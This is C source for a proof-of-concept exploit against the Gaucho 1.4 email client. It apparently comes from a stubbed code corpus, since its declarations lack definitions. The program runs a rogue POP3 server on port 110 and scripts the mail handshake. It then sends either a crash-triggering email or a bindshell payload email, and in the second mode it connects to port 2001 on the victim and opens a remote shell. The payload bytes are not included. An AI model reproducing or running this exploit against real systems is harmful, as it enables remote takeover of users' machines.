
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct sockaddr_in {int sin_port; int sin_family; } ;
typedef int sockaddr ;
typedef int sin ;
typedef int buffer ;
typedef scalar_t__ SOCKET ;
typedef int SOCKADDR ;


 int AF_INET ;
 scalar_t__ INVALID_SOCKET ;
 char* OK_MSG ;
 scalar_t__ SOCKET_ERROR ;
 int SOCK_STREAM ;
 char* STAT_REPLY ;
 int Sleep (int) ;
 char* UIDL_REPLY ;
 scalar_t__ WSAAccept (scalar_t__,int *,int*,int *,int ) ;
 int WSACleanup () ;
 int atoi (char*) ;
 scalar_t__ bindShellEmail ;
 int closesocket (scalar_t__) ;
 scalar_t__ connect (scalar_t__,int *,int) ;
 int fwrite (char*,int,int,int ) ;
 int genUIDLreply (char*) ;
 int htons (int) ;
 scalar_t__ pocEmail ;
 int printUsage (char*) ;
 int printf (char*) ;
 int recv (scalar_t__,char*,int,int ) ;
 int send (scalar_t__,char*,int ,int ) ;
 int shell (scalar_t__) ;
 scalar_t__ socket (int ,int ,int ) ;
 int stdout ;
 int strlen (char*) ;
 int tcpInit () ;
 scalar_t__ tcpListen (int) ;

int main(int argc, char* argv[])
{
printf("Proof-of-Concept POP3 server for Gaucho Ver 1.4 Vulnerabilityn");
if(argc != 2)
{
printUsage(argv[0]);
return 1;
}

int mode = atoi(argv[1]);
if(mode != 1 && mode != 2)
{
printf("nINVALID MODE!n");
printUsage(argv[0]);
return 1;
}

if(!tcpInit())
{
printf("Cannot start Winsock!n");
return 1;
}
SOCKET s = tcpListen(110);
if(s == INVALID_SOCKET)
{
printf("Cannot create listening socket!n");
return 1;
}
printf("Listening on POP3 port 110...n");

struct sockaddr_in sin;
int sin_size = sizeof(sin);
SOCKET client = WSAAccept(s, (SOCKADDR *)&sin, &sin_size, ((void*)0), 0);
char buffer[1024];
int recvSize;

if(client != INVALID_SOCKET)
{

send(client, OK_MSG, strlen(OK_MSG), 0);
recvSize = recv(client, buffer, sizeof(buffer), 0);
if(recvSize <= 0)
return 1;

fwrite(buffer, recvSize, 1, stdout);


send(client, OK_MSG, strlen(OK_MSG), 0);
recvSize = recv(client, buffer, sizeof(buffer), 0);
if(recvSize <= 0)
return 1;

fwrite(buffer, recvSize, 1, stdout);


send(client, OK_MSG, strlen(OK_MSG), 0);
recvSize = recv(client, buffer, sizeof(buffer), 0);
if(recvSize <= 0)
return 1;

fwrite(buffer, recvSize, 1, stdout);


send(client, STAT_REPLY, strlen(STAT_REPLY), 0);
recvSize = recv(client, buffer, sizeof(buffer), 0);
if(recvSize <= 0)
return 1;

fwrite(buffer, recvSize, 1, stdout);


genUIDLreply(UIDL_REPLY);
send(client, STAT_REPLY, strlen(STAT_REPLY), 0);
send(client, UIDL_REPLY, strlen(UIDL_REPLY), 0);
recvSize = recv(client, buffer, sizeof(buffer), 0);
if(recvSize <= 0)
return 1;

fwrite(buffer, recvSize, 1, stdout);


send(client, STAT_REPLY, strlen(STAT_REPLY), 0);
recvSize = recv(client, buffer, sizeof(buffer), 0);
if(recvSize <= 0)
return 1;

fwrite(buffer, recvSize, 1, stdout);

if(mode == 1)
{

send(client, (char *)pocEmail, strlen((char *)pocEmail), 0);
printf("POC crash email sent...n");

recvSize = recv(client, buffer, sizeof(buffer), 0);
if(recvSize <= 0)
return 1;

fwrite(buffer, recvSize, 1, stdout);
}
else
{

send(client, (char *)bindShellEmail, strlen((char *)bindShellEmail), 0);
printf("Bindshell email sent.   Sleeping for 2 seconds...n");
Sleep(2000);


SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
if(sock == INVALID_SOCKET)
{
printf("Invalid socket return in socket() call.n");
WSACleanup();
return -1;
}

sin.sin_family = AF_INET;
sin.sin_port = htons(2001);

if(connect(sock, (sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR)
{
printf("Exploit Failed. SOCKET_ERROR return in connect call.n");
closesocket(sock);
WSACleanup();
return -1;
}

printf("n");
shell(sock);
}
}

return 0;
}
